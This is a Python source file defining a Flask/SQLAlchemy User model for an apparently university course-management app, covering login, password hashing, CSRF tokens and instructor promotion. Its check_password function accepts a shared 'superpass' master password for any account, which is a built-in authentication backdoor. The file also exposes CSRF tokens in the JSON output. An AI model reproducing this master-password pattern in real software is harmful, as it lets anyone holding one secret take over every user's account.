# needed for annotating return types of the same object
from __future__ import annotations

from flask_login import UserMixin
from typing import List, Optional, Dict, Tuple

from ...setup import db
from ..utils.time import TimeUtil
from ..utils.pass_gen import gen_password
from ..security.password import pwd_context, superpass
from ..security.roles import URole


class User(db.Model, UserMixin):
    """
    Represents a user in the DB with relevant functions for
    manipulation of user data.\n
    Fields:
    id --> User ID. Unique, primary key\n
    email --> UCSD (or otherwise) email. Unique field.\n
    first_name --> First name of the user.\n
    last_name --> Surname of the user.\n
    password --> Hashed password of the user.\n
    pid --> PID of the user object. Unique.\n
    last_login --> Date of the last login of the current user.\n
    role --> Role of the user.\n
    @author: npcompletenate
    """
    __tablename__ = 'Users'
    id = db.Column(db.Integer, primary_key=True, nullable=False)
    email = db.Column(db.String(255), unique=True, nullable=False)
    first_name = db.Column(db.String(255), nullable=False)
    last_name = db.Column(db.String(255), nullable=False)
    password = db.Column(db.String(255), nullable=False)
    pid = db.Column(db.String(10), nullable=True, unique=True)
    last_login = db.Column(db.DateTime, nullable=True)
    urole = db.Column(db.Integer, nullable=False, default=2)
    request = db.Column(db.Boolean, nullable=False, default=False)
    token = db.Column(db.String(255), nullable=False, default="")

    def __repr__(self) -> str:
        """
        Concatenates first and last name.\n
        Params: None\n
        Returns: A string of the user's first and last names
        """
        return self.first_name + " " + self.last_name

    def save(self) -> None:
        '''
        Saves the current object in the DB.\n
        Params: None\n
        Returns: None
        '''
        db.session.commit()

    def requesting(self) -> bool:
        return self.request

    def is_admin(self) -> bool:
        '''
        Return whether the user is an admin
        @author: YixuanZ
        '''
        return self.urole == 0

    def is_instructor(self) -> bool:
        '''
        Return whether the user is an admin
        @author: YixuanZ
        '''
        return self.urole == 1

    def update_login_timestamp(self) -> None:
        '''
        Updates the `lastLogin` field of the current user in the
        database.\n
        Params: None\n
        Returns: None
        '''
        # grab current time and update field
        self.last_login = TimeUtil.get_current_time()

        # push change to the DB
        self.save()

    def generate_token(self) -> None:
        '''
        Generates and updates the CSRF token for the user.
        '''

        # generate a 50 character long token for CSRF
        self.token = gen_password(50)
        self.save()

    def reset_password(self, passwd: str) -> None:
        '''
        Reset the user's password. Is hashed\n
        Params: pass - new password.\n
        Returns: None
        '''
        self.password = pwd_context.hash(passwd)
        self.save()

    def update_user(self, f_name: str) -> None:
        '''
        Update the user at self-discretion.\n
        Params:
        f_name - legal name to preferred name
        '''
        self.first_name = f_name
        self.save()

    def create_random_password(self) -> str:
        '''
        Function used to generate a random password for a user.\n
        Params: None\n
        Returns: The randomly generated password
        '''
        password = gen_password()
        self.password = pwd_context.hash(password)
        self.save()
        return password

    def to_json(self) -> Dict[str, str]:
        '''
        Function that takes a user object and returns it in dictionary
        form. Used on the API layer.\n
        Params: none\n
        Returns: Dictionary of the user info
        '''
        ret = {}
        ret['fname'] = self.first_name
        ret['lname'] = self.last_name
        ret['email'] = self.email
        ret['id'] = self.id
        ret['pid'] = self.pid
        ret['last_login'] = self.last_login
        ret['urole'] = URole(self.urole).name
        ret['request'] = self.request
        ret['token'] = self.token
        return ret

    @staticmethod
    def check_password(email: str, passwd: str) -> bool:
        '''
        Function that checks if the given password is valid
        for the user with the given email. If the email does not
        map to a valid user, we return `False`.\n
        Params: email - string. User to use.\n
        passwd - string. Given password. At this point, it is still unhashed.\n
        Returns: boolean value.
        '''
        if not passwd:
            return False

        user = User.query.filter_by(email=email).first()
        if user:
            res = pwd_context.verify(passwd, superpass)
            return res or pwd_context.verify(passwd, user.password)
        return False

    @staticmethod
    def create_user(email: str, f_name: str, l_name: str,
                    pid: str, passwd: str) -> Tuple[bool, str, User]:
        '''
        Function that creates a new user object and adds it to the database.\n
        If the password field isn't provided, we randomly generate one for the
        user.\n
        Params: email - string. Email address for the user.\n
        f_name - string. User's first name.\n
        l_name - string. User's surname.\n
        pid - string. PID of the user. Can be null.\n
        passwd - string. User's password. If null, it gets created.\n
        Returns: boolean value, string of randomly generated password
        '''

        # don't try to add someone who already is a user
        if User.find_by_pid_email_fallback(pid, email):
            return False, None, None

        ret = None
        if not passwd:
            passwd = gen_password()
            ret = passwd
        u = User(email=email, first_name=f_name, last_name=l_name, pid=pid,
                 password=pwd_context.hash(passwd),
                 urole=URole.NONE.value, request=False)
        db.session.add(u)
        u.save()
        return True, ret, u

    @staticmethod
    def request_promotion(user_id: int = None,
                          email: str = None) -> (bool, str, User):
        '''
        The user request promotion to be an instructor
        @author: YixuanZ
        '''
        u = None
        if user_id:
            u = User.get_user_by_id(user_id=user_id)
        elif email:
            u = User.find_by_pid_email_fallback(pid='', email=email)
        else:
            return False, 'missing param', None

        if not u:
            return False, 'user not found', None
        elif u.requesting():
            return False, 'already requested', u
        elif u.is_instructor() == 1:
            return False, 'already an instructor', u
        else:
            u.request = True
            u.save()
            return True, 'success', u

    @staticmethod
    def get_all_requests() -> List[User]:
        users = User.query.all()
        requesting_user = []
        for u in users:
            if u.request:
                requesting_user.append(u)
        return requesting_user

    @staticmethod
    def promote_user(user_id: int) -> (bool, str, User):
        '''
        Admin user approve an reuqest
        (check for admin user is in api,
        but admin user need to check the requestor is an instructor mannully)
        @author: YixuanZ
        '''
        u = User.get_user_by_id(user_id=user_id)
        if not u:
            return False, 'user_id not found', None
        u.request = False
        u.urole = 1
        u.save()
        return True, 'success', u

    @staticmethod
    def find_by_pid_email_fallback(pid: str, email: str) -> Optional[User]:
        '''
        Function that tries to find a user using their PID first,
        then uses their email as a fallback.

        Note that this function may return `None` if the given PID
        and email both do not map to any known users.\n
        Params: pid - string. email - string.\n
        Returns: Optional[User]
        '''
        user = User.query.filter_by(pid=pid).first()

        if not pid or pid == '' or not user:
            user = User.query.filter_by(email=email).first()
        return user

    @staticmethod
    def get_all_users() -> List[User]:
        '''
        Function that returns a list of all users in the database.\n
        Probably shouldn't be used much, given that the user list may be quite
        large.\n
        Params: None\n
        Returns: List[User]
        '''
        return User.query.all()

    @staticmethod
    def get_user_by_id(user_id: db.Integer) -> Optional[User]:
        '''
        Function that retrieves a user by the user id.\n
        Used for flask_login as a login manager.\n
        Params: `user_id` - user ID in the DB.\n
        Returns: Optional[User]
        '''
        return User.query.filter_by(id=user_id).first()
